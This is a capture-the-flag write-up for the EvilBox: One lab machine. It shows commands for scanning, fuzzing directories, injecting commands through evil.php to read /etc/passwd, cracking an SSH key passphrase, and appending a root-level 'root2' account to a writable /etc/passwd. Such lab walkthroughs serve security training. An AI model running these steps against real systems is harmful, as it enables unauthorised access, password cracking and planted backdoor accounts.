# EvilBox: One Writeup
## Part 1. Reconnaissance

1. Network scan to find the target:
`nmap -sn 192.168.1.0/24`

![nmap scan](https://github.com/trvl009/ctf-writeups/raw/main/EvilBox-One/nmap.png)

2. Figuring out the web server:
`dirb http://192.168.1.21`

![dirb](https://github.com/trvl009/ctf-writeups/raw/main/EvilBox-One/dirb.png)

Here I discovered the following pages:

`/robots.txt`

`/secret/index.html`

On robots.txt I found the following text:

![robots.txt](https://github.com/trvl009/ctf-writeups/raw/main/EvilBox-One/robots.png)

The mentioned user "H4x0r" was a decoy.

## Part 2. Directory brute force

3. The initial wordlist was too small, so I switched to a larger one and used ffuf:
`ffuf -u http://192.168.1.21/secret/FUZZ \
-w /usr/share/seclists/Discovery/Web-Content/common.txt \
-e .php,.txt,.bak,.old,.zip`

Here I found the following page:
`evil.php`

## Part 3. Remote File Read

4. I tried to execute a command using curl, and the page was turned out to be vulnerable to it:
`curl "http://192.168.1.21/secret/evil.php?command=cat /etc/passwd"`

5. From the output I identified a valid user "mowree":

## Part 4. SSH Key Access

6. I found and cracked an RSA private key:
`chmod 600 id_rsa
ssh2john id_rsa > hash
john hash --wordlist=/usr/share/wordlists/rockyou.txt`

## Part 5. Initial Access

7. I logged in via SSH:
`ssh -i id_rsa mowree@192.168.1.21`

8. Then I captured the first flag:
`cat user.txt`

## Part 6. Privilege Escalation

9. I decided to find writable files:
`find / -xdev -type f -writable 2>/dev/null`

10. So I discovered that /etc/passwd was writable.

11. I generated a password hash and added a new root user:
`echo 'root2:$1$ZUT/rqgq$IDAanqc.AckVQKfNqyt96l:0:0:root:/root:/bin/bash' >> /etc/passwd`

12. Then I switched to the new user:
`su root2`

13. And I captured the second flag:
`cd /root
cat root.txt`
